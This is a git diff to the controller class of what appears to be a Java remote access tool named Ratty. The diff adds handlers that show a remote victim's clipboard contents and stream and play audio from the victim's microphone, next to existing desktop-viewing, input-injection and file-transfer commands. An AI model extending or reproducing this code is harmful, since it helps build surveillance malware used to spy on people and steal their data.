@@ -5,6 +5,7 @@ import java.io.File;
 import java.util.HashMap;
 import java.util.Set;
 
+import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.StubBuilder;
 import de.sogomn.rat.packet.AudioPacket;
@@ -218,8 +219,6 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = new DesktopPacket(true);
 		} else if (command == RattyGui.AUDIO) {
 			packet = createAudioPacket();
-		} else if (command == RattyGui.VOICE) {
-			packet = new VoicePacket();
 		} else if (command == FileTree.DOWNLOAD) {
 			packet = createDownloadPacket(client);
 		} else if (command == FileTree.UPLOAD) {
@@ -234,6 +233,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 			packet = client.displayPanel.getLastMouseEventPacket();
 		} else if (command == DisplayPanel.KEY_EVENT && client.isStreamingDesktop()) {
 			packet = client.displayPanel.getLastKeyEventPacket();
+		} else if (command == RattyGui.VOICE && !client.isStreamingVoice()) {
+			packet = new VoicePacket();
 		}
 		
 		return packet;
@@ -273,6 +274,24 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.displayPanel.showFrames(frames, screenWidth, screenHeight);
 	}
 	
+	private void handleClipboardPacket(final ClipboardPacket packet) {
+		final String message = packet.getClipbordContent();
+		
+		gui.showMessage(message);
+	}
+	
+	private void handleVoicePacket(final ServerClient client, final VoicePacket packet) {
+		if (!client.isStreamingVoice()) {
+			return;
+		}
+		
+		final Sound sound = packet.getSound();
+		final VoicePacket request = new VoicePacket();
+		
+		client.connection.addPacket(request);
+		sound.play();
+	}
+	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
 		final Class<? extends IPacket> clazz = packet.getClass();
 		
@@ -290,6 +309,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final DesktopPacket desktop = (DesktopPacket)packet;
 			
 			handleDesktopPacket(client, desktop);
+		} else if (clazz == ClipboardPacket.class) {
+			final ClipboardPacket clipboard = (ClipboardPacket)packet;
+			
+			handleClipboardPacket(clipboard);
+		} else if (clazz == VoicePacket.class) {
+			final VoicePacket voice = (VoicePacket)packet;
+			
+			handleVoicePacket(client, voice);
 		} else {
 			consumed = false;
 		}
